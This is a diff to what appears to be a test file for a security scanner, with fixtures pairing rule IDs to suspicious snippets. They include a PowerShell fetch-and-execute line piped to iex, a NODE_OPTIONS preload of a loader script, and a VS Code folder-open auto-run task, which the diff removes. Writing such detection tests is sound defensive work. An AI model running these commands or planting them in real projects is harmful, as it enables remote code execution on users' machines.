@@ -201,7 +201,6 @@ url = "https://internal.example/simple"
             "PA106": "NODE_OPTIONS=--require ./loader.js",
             "PA107": "Invoke-WebRequest https://example.invalid/file | iex",
             "PA108": "eth_call(); Function('synthetic')",
-            "PA109": '{"runOptions":{"runOn":"folderOpen"}}',
         }
         for rule, text in examples.items():
             hits = scan_text(".vscode/tasks.json", text)
@@ -303,7 +302,7 @@ class InterfaceTests(ProjectCase):
         replies = [json.loads(line) for line in result.stdout.splitlines()]
         self.assertEqual(len(replies), 4)
         self.assertEqual(replies[0]["error"]["code"], -32700)
-        self.assertEqual(len(replies[2]["result"]["tools"]), 3)
+        self.assertEqual(len(replies[2]["result"]["tools"]), 4)
         self.assertFalse(replies[3]["result"]["isError"])
 
 
